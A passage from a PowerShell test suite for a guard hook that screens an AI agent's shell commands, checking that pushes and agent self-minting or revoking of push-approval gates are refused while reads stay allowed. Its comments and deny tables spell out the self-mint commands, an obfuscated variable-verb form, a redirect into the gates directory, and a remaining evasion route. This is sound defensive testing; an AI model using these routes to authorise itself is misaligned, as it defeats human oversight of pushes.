    # tool_input through A1's Get-EntryField, which looks the field up on PSObject.Properties -- a
    # hashtable has none of its keys there, so a hashtable payload silently yields a NULL command
    # and every push rule below is asked about nothing. Measured while writing this member: the
    # first draft passed a hashtable and the guard returned its fallthrough allow for a plain
    # 'git push origin main'. The hook receives ConvertFrom-Json output in production, so this is
    # also the shape the real payload has.
    $h6DecU   = Get-EvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = $h6Row125 })             -Cwd $h6Repo
    $h6DecP   = Get-EvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = 'git push origin main' }) -Cwd $h6Repo
    $h6DecN   = Get-EvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = 'echo hello' })           -Cwd $h6Repo
}
finally { $env:CLAUDE_PROJECT_DIR = $prevProj }

$h6ReasonU = [string]$h6DecU.reason
$h6ReasonP = [string]$h6DecP.reason
$h6PushText = 'push is BLOCKED: no unconsumed push gate is bound to'

$h6a = ($h6ClsU -eq 'unreadable')                                  # the heredoc is named for what it is
$h6b = ([string]$h6DecU.decision -eq 'deny')                       # and the decision does not move
$h6c = ($h6ReasonU -notlike '*push is BLOCKED*')                   # the sentence stops misnaming it
$h6d = ($h6ReasonU -notmatch '[0-9a-f]{40}')                       # it quotes no tip sha
$h6e = ($h6ReasonU -notmatch 'push-[A-Za-z0-9]')                   # it names no gate id
$h6f = ($h6ClsP -eq 'push' -and [string]$h6DecP.decision -eq 'deny' -and $h6ReasonP.Contains($h6PushText))
$h6g = ($h6ClsOrd -eq 'push')                                      # ORDERING: push is asked first
$h6h = ($h6ClsN -eq 'none' -and [string]$h6DecN.decision -ne 'deny')
# SIGNATURE PRESERVED BY CONSTRUCTION, AND MEASURED ANYWAY: WP-4 :1039 and :1050 call the predicate
# as a [bool] and WP-4 is outside this edit's declared file set.
$h6i = ([bool](Test-EvidencePushCommand -Command $h6Row125) -eq $true) -and
       ([bool](Test-EvidencePushCommand -Command 'git push origin main') -eq $true) -and
       ([bool](Test-EvidencePushCommand -Command 'echo hello') -eq $false)
# NON-VACUITY: a fixture repo that never got a commit would make every reason above degrade to the
# unresolvable-root sentence, and the control would pass for the wrong reason.
$h6Reached = ($h6Tip -match '^[0-9a-f]{40}$')
$h6detail = @"
    fixture repo : $h6Repo
    fixture tip  : $h6Tip   (a real commit is required, or every reason below degrades)
    a) heredoc shape classes unreadable                   : $h6a   (expect True)
    b) ... and the decision is STILL deny                 : $h6b   (expect True)
    c) ... and the reason does NOT say push is BLOCKED    : $h6c   (expect True)
    d) ... and quotes no 40-hex tip sha                   : $h6d   (expect True)
    e) ... and names no push gate id                      : $h6e   (expect True)
    f) CONTROL: a real push classes push, denies, and its reason is byte-identical: $h6f   (expect True)
    g) ORDERING: unreadable AND a real push segment classes push  : $h6g   (expect True)
    h) a harmless command classes none and is not denied  : $h6h   (expect True)
    i) the [bool] signature WP-4 depends on is unchanged  : $h6i   (expect True)
    fixture reached                                       : $h6Reached   (expect True)

    heredoc reason measured:
      $h6ReasonU

    control reason measured:
      $h6ReasonP
"@
Check -Id 'H-6' -Title 'a git command the guard cannot READ is refused under its own name, not as a push: the reason names no gate and quotes no tip, while the real-push control keeps its sentence byte-identical' `
      -Ok ($h6a -and $h6b -and $h6c -and $h6d -and $h6e -and $h6f -and $h6g -and $h6h -and $h6i -and $h6Reached) -Detail $h6detail

# =============================================================================================
# H-7 -- A GATE-MINTING INVOCATION IS REFUSED BY TOOL AND VERB, A GATE READ IS NOT
# =============================================================================================
# THE DEFECT: "the guard gate rule is a text match on .mission/gates, so an
# agent-issued mission-gate.ps1 approve ... with -MissionRoot . may not be refused; the
# Write(.mission/gates/**) deny is a file-tool rule a child process does not pass through."
#
# DRIVEN BEFORE IT WAS CURED, and both halves were true. Every one of the four refuse-now rows
# below returned exit 0 and permissionDecision "allow" at the base of this edit, for tool_name
# Bash AND PowerShell. mission-gate.ps1 was then run against a scratch mission root in a temp
# directory and really minted push-row135selfmint.yaml with single_use true and consumed_at null,
# which the real tool's own list read back as an open build-authorization gate.
#
# AND THE TOOL DOES NOT DEFEND ITSELF. mission-gate.ps1:12 says the guard enforces agent-
# unmintability "from the other side"; there is no TTY test, no UserInteractive test, no
# environment check and no prompt in its 501 lines, and $env:USERNAME is recorded rather than
# compared. Two layers pointing at each other is a HOLE, not depth -- so this member is measuring
# the only control T-3 has for the published mint convention.
#
# BOTH DIRECTIONS OR IT MEASURES NOTHING, and here the still-admits half is the load-bearing one.
# A guard that simply denied every command naming mission-gate.ps1 would pass the refusal rows and
# would be WRONG: T-3 makes a gate unwritable, not unreadable, so the read verb and -- the
# narrowing this cure had to make explicit -- READING THE TOOL ITSELF with cat, Get-Content, grep
# or Select-String must stay allowed. Those four rows are what separate a predicate that judges
# the ACT from one that judges the presence of a filename.
#
# THE CHILD-PROCESS ROW IS THE THIRD CONTROL. instrument-WP-3 mints a real gate INSIDE its own
# process (its own call of the gate tool, never a command line); the guard never sees that text and must not start
# refusing to RUN an instrument. If the cure had quietly become a rule about child processes
# rather than about the guard-visible command line, that row goes red here and WP-3 goes red next.
$h7Id = 'session-wp1-row135'
$h7Dir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $h7Id
New-Item -ItemType Directory -Path $h7Dir -Force | Out-Null
$env:MISSION_DISPATCH_ID = $h7Id
$h7Gates = '.mission' + '/' + 'gates'
$h7Rows = @(
    [pscustomobject]@{ id = 'm1'; deny = $true;  why = "THE REGISTER'S EXACT CONVENTION: approve -Kind push -MissionRoot . -- measured ALLOW at the base";
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 approve -Kind push -MissionRoot .' }
    [pscustomobject]@{ id = 'm2'; deny = $true;  why = 'the full realistic self-mint, every argument a live push gate needs';
                       cmd = ('powershell -NoProfile -File tools/lam/mission-gate.ps1 approve -Kind push -Id selfmint ' +
                              '-Binds README.md -MissionRoot . -TipSha 0123456789abcdef0123456789abcdef01234567 ' +
                              '-OriginUrl https://x/y.git -RemoteRef refs/heads/main') }
    [pscustomobject]@{ id = 'm3'; deny = $true;  why = 'revoke: withdrawal is equally not an agent act, and it is the destructive sub-command';
                       cmd = 'powershell -File tools\lam\mission-gate.ps1 revoke -Kind push -Id x -MissionRoot .' }
    [pscustomobject]@{ id = 'm4'; deny = $true;  why = 'THE FAIL-CLOSED BRANCH: the verb is a shell variable, so the guard cannot read it';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 $V -Kind push -MissionRoot .' }
    [pscustomobject]@{ id = 'c1'; deny = $false; why = 'THE LINE THE CURE MUST NOT CROSS: list is read-only, and a gate is meant to be readable';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 list -MissionRoot .' }
    [pscustomobject]@{ id = 'c2'; deny = $false; why = 'the same with no -MissionRoot, so the allowlist does not depend on an argument';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 list' }
    [pscustomobject]@{ id = 'c3'; deny = $false; why = 'an ordinary command naming no gate and no gate tool';
                       cmd = 'git status --porcelain' }
    [pscustomobject]@{ id = 'c4a'; deny = $false; why = 'THE NARROWING: reading the tool with cat is not minting a gate';
                       cmd = 'cat tools/lam/mission-gate.ps1' }
    [pscustomobject]@{ id = 'c4b'; deny = $false; why = 'the same read through Get-Content';
                       cmd = 'Get-Content tools/lam/mission-gate.ps1' }
    [pscustomobject]@{ id = 'c4c'; deny = $false; why = 'grep over the tool -- the word approve appears, in the PATTERN, not as a verb';
                       cmd = 'grep -n approve tools/lam/mission-gate.ps1' }
    [pscustomobject]@{ id = 'c4d'; deny = $false; why = 'Select-String over the tool, where the filename follows a -Path switch';
                       cmd = 'Select-String -Pattern approve -Path tools/lam/mission-gate.ps1' }
    [pscustomobject]@{ id = 'c5'; deny = $false; why = 'the instrument that MINTS INSIDE ITS CHILD PROCESS must still be runnable';
                       cmd = 'powershell -NoProfile -File tests/lam/instrument-WP-3.ps1' }
)
$h7Lines = New-Object System.Collections.Generic.List[string]
$h7Bad = 0; $h7Deny = 0; $h7Allow = 0; $h7DenyOk = 0; $h7AllowOk = 0
foreach ($tool in @('Bash', 'PowerShell')) {
    foreach ($r in $h7Rows) {
        $payload = @{
            session_id      = $h7Id
            hook_event_name = 'PreToolUse'
            tool_name       = $tool
            tool_input      = @{ command = $r.cmd }
            cwd             = $repoRoot
        } | ConvertTo-Json -Depth 8 -Compress
        $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
        $gotDeny = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
        $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
        $ok = if ($r.deny) { $gotDeny } else { $gotAllow }
        if ($r.deny) { $h7Deny++; if ($ok) { $h7DenyOk++ } } else { $h7Allow++; if ($ok) { $h7AllowOk++ } }
        if (-not $ok) { $h7Bad++ }
        [void]$h7Lines.Add(('      {0,-4} {1,-11} want={2,-5} exit={3} {4}   {5}' -f
            $r.id, $tool, $(if ($r.deny) { 'DENY' } else { 'ALLOW' }), $res.exit,
            $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
        [void]$h7Lines.Add('              ' + $r.why)
    }
}
# THE EXISTING LITERAL-PATH CONTROL, UNCHANGED. A redirect into the gates directory must still deny
# and must still deny under ITS OWN sentence -- the act rule is placed ABOVE it, so a cure that had
# swallowed the path rule would show up here as the wrong reason rather than as a missing denial.
$h7PathCmd = 'echo authorized > ' + $h7Gates + '/push-probe.yaml'
$h7PathPayload = @{
    session_id      = $h7Id
    hook_event_name = 'PreToolUse'
    tool_name       = 'Bash'
    tool_input      = @{ command = $h7PathCmd }
    cwd             = $repoRoot
} | ConvertTo-Json -Depth 8 -Compress
$h7PathRes = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $h7PathPayload
$h7PathOk = ($h7PathRes.exit -eq 2) -and ($h7PathRes.stdout -like '*human-authored territory*')
# THE DENIAL IS RECORDED, judged the way H-1d judges its own. A deny the store cannot witness is
# half a control: the operator learns nothing afterwards, and the tripwire buys nothing at all.
$h7Recs = @(Get-LogEntries -DispatchId $h7Id |
            Where-Object { [string](Get-EntryField $_ 'tool' '') -eq '_denied' } |
            Where-Object { ([string](Get-EntryField $_ 'command' '')) -like '*mission-gate*' })
$h7RecOk = ($h7Recs.Count -eq 8) -and
           (@($h7Recs | Where-Object { [string](Get-EntryField $_ 'outcome' '') -eq 'denied' }).Count -eq $h7Recs.Count)
# AND THE PREDICATE ITSELF, ASKED DIRECTLY, so the narrowing is measured and not merely inferred
# from a decision that several rules could have produced.
$h7p1 = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 approve -Kind push -MissionRoot .')
$h7p2 = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 list -MissionRoot .')
$h7p3 = [bool](Test-EvidenceGateToolMutation -Command 'cat tools/lam/mission-gate.ps1')
$h7p4 = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1')
$h7p5 = [bool](Test-EvidenceGateToolMutation -Command 'git status')
$h7PredOk = $h7p1 -and (-not $h7p2) -and (-not $h7p3) -and $h7p4 -and (-not $h7p5)
# NON-VACUITY: a table that lost its rows would report zero divergences and prove nothing.
$h7Reached = ($h7Deny -eq 8 -and $h7Allow -eq 16)
$h7detail = @"
    T-3 says gates are agent-unmintable, and the rule enforcing it matched the literal
    text .mission/gates. The ratified mint convention never produces that string, because
    mission-gate.ps1 computes its gates directory from -MissionRoot inside the child process. All
    four refusal rows below returned exit 0 / allow at the base of this edit, for both tool names,
    and the tool then minted a real open single-use push gate against a scratch mission root.
    mission-gate.ps1 has no TTY, UserInteractive, environment or prompt check of its own, so this
    predicate is the load-bearing control rather than a second layer.
      refuse-now rows denied  : $h7DenyOk of $h7Deny
      still-admits rows allowed: $h7AllowOk of $h7Allow
      divergences             : $h7Bad   (expect 0)
      table reached           : $h7Reached   (expect True -- 8 deny rows and 16 allow rows)
      literal-path control still denies under ITS OWN sentence : $h7PathOk   (expect True)
      denial records naming mission-gate, all outcome denied   : $h7RecOk   (expect True, 8 records, got $($h7Recs.Count))
      predicate asked directly (mint/list/cat/no-verb/unrelated): $h7PredOk   (expect True)
        approve   -> $h7p1   (expect True)
        list      -> $h7p2   (expect False -- unwritable is not unreadable)
        cat tool  -> $h7p3   (expect False -- executable position, not mere mention)
        no verb   -> $h7p4   (expect True  -- named with no verb refuses)
        git status-> $h7p5   (expect False)
$($h7Lines -join ([string][char]10))
    THE HONEST BOUND, carried rather than argued away: this is a tripwire on the ratified
    spelling, not a boundary. A shell can still compute an invocation whose text never names the
    tool, which is why the unreadable branch refuses rather than allows. The durable fix is an
    operator assertion inside mission-gate.ps1, which has none and which this file set cannot add.
"@
Check -Id 'H-7' -Title 'a gate-MINTING invocation is refused by tool and verb for every role and both shell tools, the denial is recorded, and READING a gate or the gate tool is still admitted' `
      -Ok (($h7Bad -eq 0) -and $h7Reached -and $h7PathOk -and $h7RecOk -and $h7PredOk) -Detail $h7detail

# =============================================================================================
# H-9 -- THE GATE TOOL'S OWN HELP IS READ-ONLY AND REACHABLE; EVERY VERB SHAPE STAYS REFUSED
# =============================================================================================
# THE DEFECT: "tools/lam/mission-gate.ps1 -? IS REFUSED INSIDE A SESSION: T-3 rule (c) allowlists the
# single verb list, and -? is neither list nor a verb the guard can read, so it is refused with the
# mutating ones. The per-verb help surface an earlier revision BUILT -- and which WP-4 T-24
# asserts against real output -- cannot be reached by the seat it was written for. FAIL-CLOSED AND
# THEREFORE CORRECT IN DIRECTION; the cost is that a cure shipped for operators is invisible to
# every in-session reader."
#
# DRIVEN BEFORE IT WAS CURED, through this same hook and in the same shape as the table below.
# At the base of this edit all five admit-now rows returned exit 2 and permissionDecision "deny",
# for tool_name Bash AND PowerShell, and the denial sentence they drew was the gate-MUTATING-verb
# sentence -- the tool's own help classified as a mint. The mechanism is not a spelling accident:
# -? and -Help are option-shaped, so the positional collector skips them, the positional count is
# zero, and "no verb" means "mutation" means deny.
#
# THIS MEMBER IS THE ONE PLACE IN THIS FILE WHERE THE CURE REMOVES DENIALS, and it is measured as
# such. A widening is judged by what it did NOT widen, so the refuse-now half here is larger than
# the admit-now half on purpose: the bare no-verb shape, the mutating verbs, a help flag standing
# BESIDE a mutating verb in either order, an ambiguous two-positional shape, an unknown switch in
# front of a verb, and the unreadable branch all have to stay exactly where they were. A cure that
# had admitted "any command carrying -?" would pass every admit row above and would hand an agent
# `mission-gate.ps1 approve -Kind push -?`, which is a mint.
#
# AND THE ADMISSION IS BOUNDED BY A CLOSED LIST, ASSERTED AS A LIST. -H and -He are NOT admitted
# and still refuse, because the help set is exact-matched while the value-parameter set beside it
# is prefix-matched, and a prefix rule on the fail-OPEN side is how the two lists would start
# meaning each other. -MissionRoot -? still refuses too: the value parameter consumes the token
# after it, so the help flag is that parameter's argument and never reaches the help test.
#
# BOTH ROLES, because the amended clause sits in a predicate that is role-blind and must stay so:
# the operator seat is the seat this cure was written for, and a dispatched worker must see exactly
# the same answer -- a help surface that appeared only from one seat would be a new finding.
#
# AN EARLIER FINDING: THE FIXTURE CWD MOVED OUT OF THE CHECKOUT.
# This member used to drive every hook row with payload cwd = $repoRoot. The guard joins each
# relative token of the command to the payload cwd and offers the ROOTED joined form to A1's tiers
# (Get-EvidencePathForms builds it; A1's Get-EvidencePathHits then reads the augmented text). When
# the checkout root's own path carries a protected component -- WP-1 run from inside a
# .claude\worktrees\<id> worktree -- the joined form names '.claude', the ? of -? is a shell
# metacharacter, and A1's metacharacter tier refused the admit rows. Measured from
# %USERPROFILE%\b1s5\.claude\worktrees\b0: 16 DIVERGE rows (a1 a3 a4 a5, seat and worker, Bash
# and PowerShell, all exit 2; a2 -Help held) and 44 denial records against 28. A false refusal in
# the safe direction, and a property of WHERE the checkout stands rather than of the table.
#
# WHAT THE LIBRARY NEEDS OF THE CWD, read and then driven. For these rows it is used TEXTUALLY (a
# canonical join resolved for dot segments, in Get-EvidencePathForms and in the file-path offer
# loop) and by glob expansion (Resolve-EvidenceGlobForms runs Resolve-Path on <cwd>/-?, and an
# empty directory expands to nothing). It need not exist and need not lie inside a git repository:
# the one cwd reader that resolves a repository is the push-target resolver, and no row here is a
# git command. Driven through Get-EvidenceGuardDecision in a child process: row a1 ALLOWED with the
# cwd at the host temp root and at a path that does not exist, and DENIED with the cwd at
# %USERPROFILE%\b1s5\.claude\worktrees\b0, under the metacharacter sentence naming '.claude'.
#
# SO THE CWD IS NOW A SCRATCH ROOT CREATED HERE, under the host temp root, outside the repository
# and outside every protected path, and removed in the finally below. It is created (and empty) so
# the glob expansion runs against a real, known-empty directory rather than against nothing. The
# rows, their expectations, the table-size figures, the predicate-direct asserts and the H-7 corpus
# re-drive are UNCHANGED, and the help-surface narrative above is kept as written.
#
# THE PRECONDITION IS ASSERTED, NOT ASSUMED (law 5, the F-0 shape). The scratch root, and every
# row's command with the scratch root as its cwd, are put through the SAME library functions the
# tiers use -- Get-EvidencePathForms, then A1's Get-EvidencePathHits over the protected and parent
# arrays, and Test-EvidenceGatePath -- and must name none of them, and the root must lie outside the
# repository. If the host temp root itself carried a protected component this member goes RED with
# a sentence saying so; it never falls back to another root.
#
# AND A CONTROL THAT IS NOT A CONJUNCT. Row a1 is driven once more, seat role, tool Bash, with the
# cwd at a scratch directory that DOES carry .claude\worktrees\<x>, under its own session id so its
# denial record lands in its own log and not in this member's count. Its exit is PRINTED, expected
# 2: the mechanism the cure steps around is still in the guard, and the green comes from the moved
# cwd. It is not asserted because what it shows is a safe-direction false refusal that a later
# session may legitimately change.
$h9Id = 'session-wp1-row174'
$h9Dir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $h9Id
New-Item -ItemType Directory -Path $h9Dir -Force | Out-Null
$env:MISSION_DISPATCH_ID = $h9Id
Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
$h9Rows = @(
    # ---- MUST NOW ALLOW: the help surface the defect says is unreachable from a session. ---------
    [pscustomobject]@{ id = 'a1'; deny = $false; why = "THE ROW ITSELF: the tool asked for its own help. exit 2 / deny at the base of this edit";
                       cmd = 'powershell -NoProfile -File tools/lam/mission-gate.ps1 -?' }
    [pscustomobject]@{ id = 'a2'; deny = $false; why = 'the other spelling in the closed list, so the admission is not a single literal token';
                       cmd = 'powershell -NoProfile -File tools/lam/mission-gate.ps1 -Help' }
    [pscustomobject]@{ id = 'a3'; deny = $false; why = 'the BACKSLASH spelling: the path separator must not decide whether help is readable';
                       cmd = 'powershell -NoProfile -File tools\lam\mission-gate.ps1 -?' }
    [pscustomobject]@{ id = 'a4'; deny = $false; why = 'the tool in FIRST position rather than after -File, which is the other executable position';
                       cmd = './tools/lam/mission-gate.ps1 -?' }
    [pscustomobject]@{ id = 'a5'; deny = $false; why = 'help with a value-taking parameter beside it: still zero positionals, so still no verb to act on';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 -? -MissionRoot .' }
    # ---- MUST STAY REFUSED: everything the widening had to leave alone. ----------------------
    [pscustomobject]@{ id = 'd1'; deny = $true;  why = 'THE NO-VERB REFUSAL, UNCHANGED: named with nothing after it is not a request for help';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1' }
    [pscustomobject]@{ id = 'd2'; deny = $true;  why = "THE MANDATORY DENY CONTROL: the register's exact mint convention. If this row ALLOWS the whole table is void";
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 approve -Kind push -MissionRoot .' }
    [pscustomobject]@{ id = 'd3'; deny = $true;  why = 'A HELP FLAG BESIDE A MUTATING VERB: the verb is what mutates, and it is still there';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 approve -?' }
    [pscustomobject]@{ id = 'd4'; deny = $true;  why = 'the same in the other order, so the admission is not an order-of-tokens accident';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 -? revoke' }
    [pscustomobject]@{ id = 'd5'; deny = $true;  why = 'THE UNREADABLE BRANCH, WHICH RUNS FIRST AND IS UNTOUCHED: a help flag does not make a variable readable';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 -? $root' }
    [pscustomobject]@{ id = 'd6'; deny = $true;  why = 'the ambiguous two-positional shape: exactly one positional is still required of a read';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 list approve' }
    [pscustomobject]@{ id = 'd7'; deny = $true;  why = 'an unknown switch, a mutating verb and a help flag together: the unknown switch still defers and the verb still decides';
                       cmd = 'powershell -File tools/lam/mission-gate.ps1 -Unknown approve -?' }
)
# THE SCRATCH CWD (see the block above that moved the fixture cwd out of the checkout).
$h9TempRoot = [System.IO.Path]::GetTempPath()
$h9CwdRoot = Join-Path $h9TempRoot ('lam-wp1-h9-cwd-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $h9CwdRoot -Force | Out-Null
# THE PRECONDITION, measured through the library's own form and hit functions.
$h9CwdProt = New-Object System.Collections.Generic.List[string]
$h9CwdParent = New-Object System.Collections.Generic.List[string]
$h9CwdGate = New-Object System.Collections.Generic.List[string]
$h9CwdFormCount = 0
$h9CwdProbes = New-Object System.Collections.Generic.List[object]
[void]$h9CwdProbes.Add(@{ text = $h9CwdRoot; cwd = '' })
foreach ($r in $h9Rows) { [void]$h9CwdProbes.Add(@{ text = $r.cmd; cwd = $h9CwdRoot }) }
foreach ($pr in $h9CwdProbes) {
    $h9Forms = @(Get-EvidencePathForms -Text $pr.text -Cwd $pr.cwd)
    $h9CwdFormCount += $h9Forms.Count
    foreach ($h in @(Get-EvidencePathHits -Text ($h9Forms -join ' ') -Patterns $script:EvidenceProtectedPaths)) { [void]$h9CwdProt.Add($h) }
    foreach ($h in @(Get-EvidencePathHits -Text ($h9Forms -join ' ') -Patterns $script:EvidenceParentPaths)) { [void]$h9CwdParent.Add($h) }
    foreach ($f in $h9Forms) { if ($f -and (Test-EvidenceGatePath -Path $f)) { [void]$h9CwdGate.Add($f) } }
}
$h9RepoCanon = ((ConvertTo-CanonicalPathText -Text $repoRoot).TrimEnd('/') + '/').ToLowerInvariant()
$h9CwdCanon = ((ConvertTo-CanonicalPathText -Text $h9CwdRoot).TrimEnd('/') + '/').ToLowerInvariant()
$h9CwdOutside = -not $h9CwdCanon.StartsWith($h9RepoCanon)
# NON-VACUITY OF THE PRECONDITION: the arrays it matches against are A1's and must be populated, and
# the probes must have produced forms -- an empty pattern list or an empty form list matches nothing.
$h9CwdArraysReached = (@($script:EvidenceProtectedPaths).Count -gt 0) -and (@($script:EvidenceParentPaths).Count -gt 0) -and
                      ($h9CwdProbes.Count -eq ($h9Rows.Count + 1)) -and ($h9CwdFormCount -gt $h9CwdProbes.Count)
$h9CwdOk = ($h9CwdProt.Count -eq 0) -and ($h9CwdParent.Count -eq 0) -and ($h9CwdGate.Count -eq 0) -and
           $h9CwdOutside -and $h9CwdArraysReached
$h9CwdSentence = if ($h9CwdOk) {
    'the scratch cwd and every row joined to it name no protected, parent or gate path, and the root lies outside the repository'
} else {
    ("THE SCRATCH CWD IS NOT CLEAN, so this member cannot step around the checkout-shape mechanism on this host and is RED for that reason, not for a guard verdict: " +
     "'$h9CwdRoot' (under the host temp root '$h9TempRoot') gave protected hits [$($h9CwdProt -join ', ')], parent hits [$($h9CwdParent -join ', ')], " +
     "gate forms [$($h9CwdGate -join ', ')], outside the repository = $h9CwdOutside, arrays and forms reached = $h9CwdArraysReached. No other root is tried.")
}
$h9Lines = New-Object System.Collections.Generic.List[string]
$h9Bad = 0; $h9Deny = 0; $h9Allow = 0; $h9DenyOk = 0; $h9AllowOk = 0
$h9CtlExit = 'not run'; $h9CtlDecision = 'not run'
$h9CtlId = 'session-wp1-row174-cwdctl'
$h9CtlCwd = Join-Path $h9CwdRoot '.claude\worktrees\h9ctl'
try {
    foreach ($seat in @('seat', 'worker')) {
        # LAM_DISPATCH IS SET IN THIS INSTRUMENT PROCESS ONLY so the hook CHILD inherits it, exactly as
        # H-8 does it, and it is removed again after the table -- a leaked marker would silently make
        # every later measurement in this file a worker measurement.
        if ($seat -eq 'worker') { $env:LAM_DISPATCH = $h9Id } else { Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue }
        foreach ($tool in @('Bash', 'PowerShell')) {
            foreach ($r in $h9Rows) {
                $payload = @{
                    session_id      = $h9Id
                    hook_event_name = 'PreToolUse'
                    tool_name       = $tool
                    tool_input      = @{ command = $r.cmd }
                    cwd             = $h9CwdRoot
                } | ConvertTo-Json -Depth 8 -Compress
                $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
                $gotDeny = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
                $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
                $ok = if ($r.deny) { $gotDeny } else { $gotAllow }
                if ($r.deny) { $h9Deny++; if ($ok) { $h9DenyOk++ } } else { $h9Allow++; if ($ok) { $h9AllowOk++ } }
                if (-not $ok) { $h9Bad++ }
                [void]$h9Lines.Add(('      {0,-3} {1,-6} {2,-11} want={3,-5} exit={4} {5}   {6}' -f
                    $r.id, $seat, $tool, $(if ($r.deny) { 'DENY' } else { 'ALLOW' }), $res.exit,
                    $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
                [void]$h9Lines.Add('              ' + $r.why)
            }
        }
    }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    # THE CONTROL, NOT A CONJUNCT: row a1, seat role, Bash, cwd carrying .claude\worktrees\<x>, under
    # its own session and dispatch id so its denial record is not counted by $h9Recs below.
    $h9CtlDir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $h9CtlId
    New-Item -ItemType Directory -Path $h9CtlDir -Force | Out-Null
    New-Item -ItemType Directory -Path $h9CtlCwd -Force | Out-Null
    $env:MISSION_DISPATCH_ID = $h9CtlId
    $h9CtlPayload = @{
        session_id      = $h9CtlId
        hook_event_name = 'PreToolUse'
        tool_name       = 'Bash'
        tool_input      = @{ command = $h9Rows[0].cmd }
        cwd             = $h9CtlCwd
    } | ConvertTo-Json -Depth 8 -Compress
    $h9CtlRes = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $h9CtlPayload
    $h9CtlExit = $h9CtlRes.exit
    $h9CtlDecision = if ($h9CtlRes.stdout -like '*"permissionDecision":"deny"*') { 'deny' } elseif ($h9CtlRes.stdout -like '*"permissionDecision":"allow"*') { 'allow' } else { 'neither' }
}
finally {
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    $env:MISSION_DISPATCH_ID = $h9Id
    Remove-Item -LiteralPath $h9CwdRoot -Recurse -Force -ErrorAction SilentlyContinue
}
$h9CwdRemoved = -not (Test-Path -LiteralPath $h9CwdRoot)
# THE DENY CONTROL, PULLED OUT AND JUDGED ON ITS OWN. A widening member whose refusal rows had all
# quietly stopped firing would report a clean table; this is the row that makes the table mean
# something, so it is asserted by name rather than only counted.
$h9CtlBad = @($h9Lines | Where-Object { $_ -like '      d2 *' -and $_ -like '*DIVERGE*' }).Count
# NON-VACUITY: a table that lost its rows would report zero divergences and prove nothing.
$h9Reached = ($h9Deny -eq 28 -and $h9Allow -eq 20)
# THE DENIAL IS STILL RECORDED for every row that still refuses -- judged the way H-1d and H-7
# judge theirs. A widening that had silenced the record instead of moving the verdict would look
# identical from the exit code alone.
$h9Recs = @(Get-LogEntries -DispatchId $h9Id |
            Where-Object { [string](Get-EntryField $_ 'tool' '') -eq '_denied' } |
            Where-Object { ([string](Get-EntryField $_ 'command' '')) -like '*mission-gate*' })
$h9RecOk = ($h9Recs.Count -eq $h9Deny) -and
           (@($h9Recs | Where-Object { [string](Get-EntryField $_ 'outcome' '') -eq 'denied' }).Count -eq $h9Recs.Count)
# THE PREDICATE ASKED DIRECTLY, for the edges a hook row cannot show cleanly -- the two lists that
# sit beside each other and must not start meaning each other.
$h9p1  = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 -?')
$h9p2  = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 -Help')
$h9p3  = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1')
$h9p4  = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 -H')
$h9p5  = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 -He')
$h9p6  = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 -MissionRoot -?')
$h9p7  = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 -? ; powershell -File tools/lam/mission-gate.ps1 approve')
$h9p8  = [bool](Test-EvidenceGateToolMutation -Command 'powershell -File tools/lam/mission-gate.ps1 list -MissionRoot .')
$h9PredOk = (-not $h9p1) -and (-not $h9p2) -and $h9p3 -and $h9p4 -and $h9p5 -and $h9p6 -and $h9p7 -and (-not $h9p8)
# THE ADMITTED SET IS A CLOSED LITERAL LIST, ASSERTED AS A LIST. The design constraint is not only
# that -? works: it is that the set of tokens able to REMOVE a denial is small, spelled out and
# reviewable. A cure that had reached for a regex would satisfy every row above and fail here.
$h9FlagSet = @($script:EvidenceGateToolHelpFlags)
$h9ListOk = ($h9FlagSet.Count -eq 2) -and ($h9FlagSet -contains '?') -and ($h9FlagSet -contains 'help')
# AND THE H-7 MINTING CORPUS, RE-DRIVEN AT THIS TIP TO SHOW IT DID NOT MOVE. Every row of H-7's
# own table is put back through the predicate here: the four mint shapes must still answer
